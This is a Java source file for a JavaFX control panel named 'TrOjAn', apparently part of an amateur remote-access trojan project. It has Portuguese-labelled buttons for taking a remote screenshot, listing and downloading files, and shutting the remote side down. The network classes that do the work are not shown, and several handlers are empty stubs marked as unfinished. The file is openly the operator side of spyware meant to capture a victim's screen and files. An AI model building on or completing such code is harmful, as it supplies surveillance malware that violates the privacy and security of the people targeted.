/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package trojan.hacker;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Application;
import static javafx.application.Application.launch;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.StackPane;
import javafx.stage.Stage;
import network.ClientePic;
import network.ServerComPic;
import static javafx.application.Application.launch;
import static javafx.application.Application.launch;
import static javafx.application.Application.launch;
import network.ServerComFTP;
import network.ServerComOff;

/**
 *
 * @author UserPL022Pc01
 */
public class TrOjAnHacker extends Application {
    
    public String ftpNum;

    @Override
    public void start(Stage primaryStage) {    

        Button btnTakePic = new Button(),
                btnFTP = new Button(),
                btnAccept = new Button(),
                btnStop = new Button();
        Label lblFTP = new Label("Nº do ficheiro: ");
        TextField txFTP = new TextField();

        btnTakePic.setText("Tirar screenshot");
        btnTakePic.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                System.out.println("Tirando Screenshot...");
                ServerComPic scp = new ServerComPic();
                try {
                    ClientePic cp = new ClientePic();
                } catch (IOException ex) {
                    Logger.getLogger(TrOjAnHacker.class.getName()).log(Level.SEVERE, null, ex);
                }
                System.out.println("Screenshot recebida!");
            }
        });

        btnFTP.setText("Listar finheiros"); //POR FAZER
        btnFTP.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {

            }
        });

        btnAccept.setText("Download"); //POR FAZER
        btnAccept.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                ftpNum = txFTP.getText();
                ServerComFTP scf = new ServerComFTP();
            }
        });
        
        btnStop.setText("Desligar"); //POR FAZER
        btnStop.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                ServerComOff sco = new ServerComOff();
                Stage stage = (Stage) btnStop.getScene().getWindow();
                stage.close();
            }
        });

        GridPane root = new GridPane();
        root.add(btnTakePic, 1, 0);
        root.add(btnFTP, 1, 1);
        root.add(lblFTP, 0, 2);
        root.add(txFTP, 1, 2);
        root.add(btnAccept, 2, 2);

        root.setVgap(10);

        Scene scene = new Scene(root, 375, 250);

        primaryStage.setTitle("TrOjAn");
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        launch(args);
    }

}
